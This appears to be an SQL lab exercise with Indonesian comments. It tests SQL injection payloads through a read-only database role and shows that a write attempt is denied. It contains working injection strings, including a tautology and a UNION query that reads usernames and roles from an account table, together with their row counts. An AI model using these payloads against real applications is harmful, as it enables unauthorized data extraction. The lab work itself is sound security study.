-- Q14: batas hak
-- Payload sama seperti Q13, dijalankan lewat koneksi app_laporan (anggota app_read, tanpa hak tulis).

-- Payload 1: zz' OR '1'='1
SELECT id, nama, kota FROM lab11.pelanggan WHERE nama ILIKE '%zz' OR '1'='1%' LIMIT 100;
-- jumlah baris (app_laporan): 0

-- Payload 2: zz' OR '1'='1' --
SELECT id, nama, kota FROM lab11.pelanggan WHERE nama ILIKE '%zz' OR '1'='1' --%' LIMIT 100
;
-- jumlah baris (app_laporan): 10000

-- Payload 3: UNION ke tabel akun
SELECT id, nama, kota FROM lab11.pelanggan WHERE nama ILIKE '%zz' UNION SELECT '1', nama_pengguna, peran_aplikasi FROM lab11.akun --%' LIMIT 100
-- jumlah baris (app_laporan): 4
-- hasil: sinta, ratna, yusuf, bagas (kolom nama_pengguna dan peran_aplikasi)

-- Uji hak tulis (dibungkus transaksi, data tidak berubah)
-- BEGIN; SET LOCAL ROLE app_laporan; UPDATE lab11.pelanggan SET kota = kota WHERE id = 3; ROLLBACK;
-- hasil: ERROR: permission denied for table pelanggan